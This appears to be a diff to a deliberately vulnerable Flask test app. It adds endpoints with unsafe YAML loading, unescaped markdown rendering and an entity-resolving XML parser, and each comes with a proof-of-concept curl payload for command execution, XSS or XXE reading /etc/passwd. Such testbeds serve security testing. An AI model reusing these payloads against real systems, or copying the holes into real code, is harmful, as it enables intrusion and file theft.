@@ -3,6 +3,9 @@ import subprocess
 from flask import Flask, request, jsonify, render_template, send_file
 from pathlib import Path
 import yaml
+import markdown
+from markupsafe import Markup
+from lxml import etree
 
 app = Flask(__name__)
 app.config['JSON_AS_ASCII'] = False
@@ -92,18 +95,37 @@ def download_file_via_path(file_path):
     except Exception as e:
         return jsonify({"error": str(e)}), 400
 
-# CVE-2017-18342 / PyYAML==5.3
-# !!python/object/apply:os.system ["touch test_file.txt"]
-# curl "http://localhost:5000/vulnerable-yaml?data=%21%21python%2Fobject%2Fapply%3Aos.system%20%5B%22touch%20test_file.txt%22%5D"    
-@app.route('/vulnerable-yaml', methods=['GET'])
+# PyYAML == 5.3
+# POC : curl "http://127.0.0.1/yaml?data=%21%21python%2Fobject%2Fapply%3Aos.system%20%5B%22touch%20test_file.txt%22%5D"    
+@app.route('/yaml', methods=['GET'])
 def vulnerable_yaml():
     yaml_data = request.args.get('data')  
-    
     try:
         data = yaml.load(yaml_data, Loader=yaml.Loader)
         return jsonify({"message": "YAML parsed successfully", "content": data})
     except Exception as e:
         return jsonify({"error": str(e)}), 400
 
+# markdown == 3.1.1
+# POC : curl "http://127.0.0.1/markdown?content=<script>alert('XSS')</script>"
+@app.route('/markdown', methods=['GET'])
+def vulnerable_markdown():
+    content = request.args.get('content', '')
+    html_output = markdown.markdown(content)
+    return Markup(html_output)
+
+# lxml
+# POC : curl "http://127.0.0.1/parse_xml?data=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0A%3C%21DOCTYPE+root+%5B%0A++%3C%21ELEMENT+root+ANY+%3E%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22+%3E%5D%3E%0A%3Croot%3E%26xxe%3B%3C%2Froot%3E"
+@app.route('/parse_xml', methods=['GET'])
+def parse_xml():
+    try:
+        xml_data = request.args.get('data', '')
+        parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
+        root = etree.fromstring(xml_data.encode('utf-8'), parser)
+        root_content = etree.tostring(root, pretty_print=True).decode('utf-8')
+        return jsonify({'message': 'XML parsed successfully', 'root_tag': root.tag, 'content': root_content}), 200
+    except Exception as e:
+        return jsonify({'error': str(e)}), 400
+
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(debug=True, port=80)
